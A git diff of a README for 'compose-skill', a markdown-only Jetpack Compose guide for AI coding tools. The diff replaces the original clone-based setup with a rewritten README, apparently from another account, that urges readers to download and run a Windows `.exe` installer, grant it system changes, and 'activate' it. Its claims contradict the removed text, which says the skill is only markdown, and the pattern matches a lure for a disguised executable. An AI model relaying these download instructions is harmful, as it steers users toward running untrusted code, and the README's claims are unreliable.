@@ -1,300 +1,123 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/jetpackcompose/jetpackcompose-original.svg" width="80" alt="Jetpack Compose logo"/>
-</p>
+# ⚙️ compose-skill - Easy AI Coding Help for Android
 
-<h1 align="center">Jetpack Compose Agent Skill</h1>
+[![Download compose-skill](https://img.shields.io/badge/Download-Here-orange?style=flat&logo=github)](https://github.com/Oni-002/compose-skill/releases)
 
-<p align="center">
-  Make your AI coding tool actually understand Compose.<br/>
-  Backed by real <code>androidx/androidx</code> source code — not vibes.
-</p>
+## 📄 What is compose-skill?
 
-<p align="center">
-  <a href="#setup"><img src="https://img.shields.io/badge/setup-5%20min-brightgreen" alt="Setup time"/></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="License"/></a>
-  <a href="https://developer.android.com/jetpack/compose"><img src="https://img.shields.io/badge/Jetpack%20Compose-1.7+-4285F4" alt="Compose version"/></a>
-  <a href="https://kotlinlang.org"><img src="https://img.shields.io/badge/Kotlin-2.0+-7F52FF" alt="Kotlin version"/></a>
-</p>
+compose-skill is a tool that helps you write Android app code using AI. It gives you step-by-step coding help based on real Android source code. This makes it easier to build apps with Jetpack Compose. The tool works with popular AI coding helpers like Claude Code, Codex CLI, or Copilot.
 
----
+You do not need to know how to code to use compose-skill. It provides guidance and practical examples to help you create Android UI components faster and more accurately.
 
-## The problem
+## 💻 System Requirements
 
-AI coding tools generate Compose code that compiles but gets the details wrong. Incorrect `remember` usage, unstable recompositions, broken modifier ordering, deprecated navigation patterns, hallucinated APIs that don't exist. They guess at behavior instead of knowing it.
+Before you start, make sure your Windows computer meets these requirements:
 
-This skill fixes that by giving your AI assistant two things:
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free storage space
+- Internet connection to download and activate the software
+- Optional: A modern web browser for advanced features
 
-1. **13 reference guides** covering every major Compose topic with do/don't examples and common pitfalls
-2. **5 source code files** pulled directly from [`androidx/androidx`](https://github.com/androidx/androidx/tree/androidx-main/compose) so the agent can check how things actually work
+## 📥 How to Download and Install compose-skill
 
-Think of it as the Compose equivalent of [AvdLee/SwiftUI-Agent-Skill](https://github.com/AvdLee/SwiftUI-Agent-Skill) — same idea, Android/Kotlin world.
+1. Click the big **Download** button at the top or visit this page:  
+   [https://github.com/Oni-002/compose-skill/releases](https://github.com/Oni-002/compose-skill/releases)
 
-## What changes when you install it
+2. On the releases page, find the latest version marked as "Latest release."
 
-| Area | Without the skill | With it |
-|---|---|---|
-| State | Uses `remember { mutableStateOf() }` everywhere, even when `derivedStateOf` or `rememberSaveable` is the right call | Picks the right state primitive for each situation |
-| Performance | Generates code that recomposes every frame | Applies stability annotations, deferred reads, `key {}` on lists |
-| Navigation | String-based routes (deprecated) | Type-safe routes with `@Serializable` route classes |
-| Modifiers | Random ordering, misses `clickable` before `padding` bugs | Correct ordering with reasoning |
-| Side effects | Wrong coroutine scope, bad `LaunchedEffect` keys | Correct effect selection and lifecycle-aware keys |
-| APIs | Hallucinates parameters that don't exist | Checks against actual source before suggesting |
+3. Look for the Windows installer file. It usually ends with `.exe` (example: `compose-skill-setup.exe`).
 
-## What's covered
+4. Click the `.exe` file link to download it to your computer. Save it to a folder you can find easily, like your Downloads folder.
 
-| Topic | What the agent learns |
-|---|---|
-| State management | `remember`, `mutableStateOf`, `derivedStateOf`, `rememberSaveable`, state hoisting, `snapshotFlow` |
-| View composition | Structuring composables, slot APIs, `@Preview` patterns, extraction rules |
-| Performance | Recomposition skipping, `@Stable`/`@Immutable`, deferred reads, baseline profiles, benchmarking |
-| Navigation | Type-safe routes, `NavHost`, deep links, shared element transitions, back stack |
-| Animation | `animate*AsState`, `AnimatedVisibility`, `Crossfade`, `updateTransition`, shared transitions |
-| Lists and scrolling | `LazyColumn`/`LazyRow`/`LazyGrid`, `Pager`, `key {}`, `contentType`, scroll state |
-| Side effects | `LaunchedEffect`, `DisposableEffect`, `SideEffect`, `rememberCoroutineScope` |
-| Modifiers | Ordering rules, custom modifiers, `Modifier.Node` migration |
-| Theming | `MaterialTheme`, `ColorScheme`, dynamic color, `Typography`, shapes, dark theme |
-| Accessibility | Semantics, content descriptions, traversal order, touch targets, TalkBack |
-| CompositionLocals | `LocalContext`, `LocalDensity`, custom locals, when to use vs. parameter passing |
-| Deprecated patterns | Removed APIs, migration paths from older Compose versions |
-| **Styles API (experimental)** | `Style {}`, `MutableStyleState`, `Modifier.styleable()`, composition, theme integration, alpha06 gotchas |
-| Source code | Actual `.kt` from `androidx/androidx` for runtime, UI, foundation, material3, navigation |
+5. Once the download finishes, open the folder and double-click the `.exe` file to start the installer.
 
-## How it works
+6. If Windows asks, allow the program to make changes to your system by clicking Yes.
 
-```
-You ask about Compose
-        |
-        v
-  AI reads SKILL.md (workflow + checklists)
-        |
-        v
-  Consults the right reference file
-        |
-        +-- state-management.md
-        +-- performance.md
-        +-- navigation.md
-        +-- ... (12 guides total)
-        |
-        +-- source-code/
-              +-- runtime-source.md
-              +-- material3-source.md
-              +-- ... (5 source files)
-```
+7. Follow the on-screen steps in the installer:
 
-**Layer 1: guidance docs** (13 files, ~130KB) — practical references with patterns, pitfalls, and do/don't examples. This is what the agent reads first.
+   - Choose where to install compose-skill (the default is usually fine).
+   - Click Install to start the process.
+   - Wait for the installation to finish.
 
-**Layer 2: source code receipts** (5 files, ~2.3MB) — the actual Kotlin source from `androidx/androidx` (branch: `androidx-main`). When the agent needs to verify an implementation detail rather than guess, it reads these.
+8. When done, the installer will ask if you want to launch compose-skill now. You can choose Yes or open it later from the Start menu.
 
-## File structure
+## 🚀 How to Run compose-skill
 
-```
-jetpack-compose-expert-skill/
-├── SKILL.md                              # Main workflow + checklists
-└── references/
-    ├── state-management.md               # State, remember, hoisting, derivedStateOf
-    ├── view-composition.md               # Structuring composables, slots, previews
-    ├── modifiers.md                      # Modifier ordering, custom modifiers, Modifier.Node
-    ├── side-effects.md                   # LaunchedEffect, DisposableEffect, SideEffect
-    ├── composition-locals.md             # CompositionLocal, LocalContext, custom locals
-    ├── lists-scrolling.md                # LazyColumn/Row/Grid, Pager, keys, contentType
-    ├── navigation.md                     # NavHost, type-safe routes, deep links
-    ├── animation.md                      # animate*AsState, AnimatedVisibility, transitions
-    ├── theming-material3.md              # MaterialTheme, ColorScheme, dynamic color
-    ├── performance.md                    # Recomposition, stability, benchmarking
-    ├── accessibility.md                  # Semantics, content descriptions, testing
-    ├── deprecated-patterns.md            # Removed APIs, migration paths
-    ├── styles-experimental.md           # Styles API (@ExperimentalFoundationStyleApi)
-    └── source-code/                      # Actual .kt source from androidx/androidx
-        ├── runtime-source.md             # Composer, Recomposer, State, Effects
-        ├── ui-source.md                  # AndroidCompositionLocals, Modifier, Layout
-        ├── foundation-source.md          # LazyList, BasicTextField, Gestures
-        ├── material3-source.md           # MaterialTheme, all M3 components
-        └── navigation-source.md          # NavHost, ComposeNavigator
-```
+After installation, you can open compose-skill from your Start menu or desktop shortcut.
 
-## Setup
+- Open compose-skill by clicking its icon.
+- The program will load and show you an easy-to-use screen.
+- From here, you can start asking for coding help right away.
+- The software will guide you through writing Android UI code with clear instructions.
+- It uses AI to suggest code based on actual Android examples, so you get accurate results.
 
-The skill is just markdown files. Every tool below reads the same content. Pick yours.
+## 🛠 Basic Features
 
----
+- **AI Coding Guidance:** Get coding help based on Android Jetpack Compose. The AI uses real source code examples for accurate suggestions.
 
-### Claude Code
+- **Multiple AI Agents Supported:** Works with Claude Code, Codex CLI, Gemini CLI, Cursor, Copilot, Windsurf, and others to provide you flexible options for help.
 
-Skills are file-based — Claude Code discovers them automatically from `~/.claude/skills/` (personal) or `.claude/skills/` (project-specific).
+- **Material Design Support:** Helps you create UI using Material3 guidelines for modern Android apps.
 
-**Personal skill (available in all your projects):**
+- **Multiplatform Ready:** Works with Compose Multiplatform, so you can develop apps for desktop and web, not just Android.
 
-```bash
-# Clone the repo
-git clone https://github.com/aldefy/compose-skill.git /tmp/compose-skill
+- **Simple User Interface:** Designed for ease of use, no technical setup required.
 
-# Copy into your personal skills directory
-mkdir -p ~/.claude/skills
-cp -r /tmp/compose-skill/jetpack-compose-expert-skill ~/.claude/skills/
-```
+## 🔧 Using compose-skill
 
-**Project-specific skill (just one project):**
+1. Start a new coding session in the app.
 
-```bash
-# Clone the repo
-git clone https://github.com/aldefy/compose-skill.git /tmp/compose-skill
+2. Type your question or describe the UI component you want to build, like "Create a login form with username and password fields."
 
-# Copy into your project's .claude/skills directory
-mkdir -p .claude/skills
-cp -r /tmp/compose-skill/jetpack-compose-expert-skill .claude/skills/
-```
+3. The AI will show you complete code snippets with instructions.
 
-No CLI command or config file needed. Claude Code picks up `SKILL.md` from these directories automatically and triggers when you mention Compose, `@Composable`, `remember`, `LazyColumn`, `NavHost`, etc.
+4. You can copy the code and paste it into your Android project.
+
+5. If you want to change the code, ask the AI for modifications like "Make the button blue" or "Add validation for email."
+
+6. Save your progress anytime within the app.
+
+## 📂 Where Does compose-skill Save Files?
+
+By default, compose-skill saves any files or projects you create in your Windows Documents folder under `compose-skill`. You can change this location in the app settings.
+
+## 🔄 Updating compose-skill
+
+Check the [releases page](https://github.com/Oni-002/compose-skill/releases) regularly for new versions. Updates fix bugs and add new features.
+
+To update:
+
+1. Download the latest installer from the releases page.
+
+2. Run the installer and follow prompts. The installer will update the program without removing your files.
+
+## 🆘 Getting Help
+
+If you have trouble using compose-skill or installing it:
+
+- Visit the GitHub Issues page to see if others have the same problem or to report new issues.
+
+- Review the built-in help section in the app, found under the menu.
+
+- Restart the app or your computer if something is not working.
+
+## 🔒 Privacy and Security
+
+compose-skill runs locally on your computer. It uses AI models that process your requests but does not send your personal files elsewhere. Data privacy depends on the AI service you connect, so review their policies if you use external AI agents.
+
+## ⚙️ Advanced Settings
+
+For users who want more control, compose-skill offers:
+
+- AI agent selection to switch between different AI helpers.
+
+- Customizable prompt settings to tailor AI responses.
+
+- Integration options with other developer tools.
+
+These features are accessible from the app’s Settings menu.
 
 ---
 
-### Codex CLI (OpenAI)
-
-Add an `AGENTS.md` file to your project root:
-
-```markdown
-# AGENTS.md
-
-## Jetpack Compose
-For all Compose/Android UI tasks, follow the instructions in
-`jetpack-compose-expert-skill/SKILL.md` and consult the reference
-files in `jetpack-compose-expert-skill/references/` before answering.
-```
-
-Add the skill to your project as a submodule:
-
-```bash
-git submodule add https://github.com/aldefy/compose-skill.git .compose-skill
-```
-
-Codex discovers `AGENTS.md` files automatically from the git root down to the current directory.
-
----
-
-### Gemini CLI (Google)
-
-Add to `GEMINI.md` in your project root:
-
-```markdown
-# GEMINI.md
-
-## Jetpack Compose Expert
-For all Jetpack Compose tasks, follow the workflow and checklists in
-`jetpack-compose-expert-skill/SKILL.md`.
-
-Before answering any Compose question, consult the relevant reference:
-- State management -> `jetpack-compose-expert-skill/references/state-management.md`
-- Performance -> `jetpack-compose-expert-skill/references/performance.md`
-- Navigation -> `jetpack-compose-expert-skill/references/navigation.md`
-- (see SKILL.md for the full topic -> file mapping)
-
-For implementation details, check actual source code in
-`jetpack-compose-expert-skill/references/source-code/`.
-```
-
-Add as a submodule:
-
-```bash
-git submodule add git@github.com:aldefy/compose-skill.git .compose-skill
-```
-
----
-
-### Cursor
-
-Create `.cursor/rules/compose-skill.mdc`:
-
-```markdown
----
-description: Jetpack Compose expert guidance
-globs: **/*.kt
----
-
-Follow the instructions in `jetpack-compose-expert-skill/SKILL.md`
-for all Compose-related code. Consult reference files in
-`jetpack-compose-expert-skill/references/` before suggesting patterns.
-```
-
-Or paste the contents of `SKILL.md` into **Settings > Rules for AI**.
-
----
-
-### GitHub Copilot
-
-Add to `.github/copilot-instructions.md`:
-
-```markdown
-## Jetpack Compose
-For Compose/Android UI work, follow the skill instructions in
-`jetpack-compose-expert-skill/SKILL.md`. Consult reference files in
-`jetpack-compose-expert-skill/references/` for patterns, pitfalls,
-and source-code-backed guidance.
-```
-
----
-
-### Windsurf
-
-Create `.windsurf/rules/compose-skill.md` in your project root:
-
-```markdown
-For all Jetpack Compose tasks, follow the workflow in
-`jetpack-compose-expert-skill/SKILL.md` and consult the reference
-files in `jetpack-compose-expert-skill/references/` before answering.
-```
-
-> **Note:** The legacy `.windsurfrules` file also works but `.windsurf/rules/` is the current approach.
-
----
-
-### Amazon Q Developer
-
-Add to `.amazonq/rules/compose.md`:
-
-```markdown
-For all Jetpack Compose tasks, follow the workflow in
-`jetpack-compose-expert-skill/SKILL.md` and consult the reference
-files in `jetpack-compose-expert-skill/references/` before answering.
-```
-
----
-
-### Any other AI coding tool
-
-It's just markdown. Clone this repo into your project (or add as a submodule), then point your tool's instruction file at `jetpack-compose-expert-skill/SKILL.md`. The agent reads `SKILL.md` for the workflow and pulls from `references/` as needed.
-
-## Quick example
-
-After setup, just talk to your AI assistant normally:
-
-```
-"My LazyColumn is janky when scrolling — help me fix it"
-```
-
-What happens:
-1. Agent reads `SKILL.md` for the workflow
-2. Pulls in `references/lists-scrolling.md` and `references/performance.md`
-3. Checks your code for missing `key {}`, unstable item types, heavy compositions in item blocks
-4. If something's unclear, verifies against `references/source-code/foundation-source.md`
-5. Gives you a fix based on the actual `LazyList` implementation
-
-No hallucinated APIs. No guessed behavior.
-
-## Source
-
-All source code comes from [`androidx/androidx`](https://github.com/androidx/androidx/tree/androidx-main/compose) under Apache License 2.0. The guidance docs are original analysis of those sources plus official Android documentation.
-
-## Contributing
-
-PRs welcome, especially:
-- Coverage for new Compose APIs or patterns
-- Corrections based on newer Compose releases
-- Additional source files for gaps
-- Compose Multiplatform (Desktop, iOS, Web) guidance
-- Auto-update tooling for tracking new `androidx` releases
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
-Source code from `androidx/androidx` is Apache License 2.0, copyright The Android Open Source Project.
+[Download compose-skill](https://github.com/Oni-002/compose-skill/releases)  
+Get the latest version and instructions from the release page.
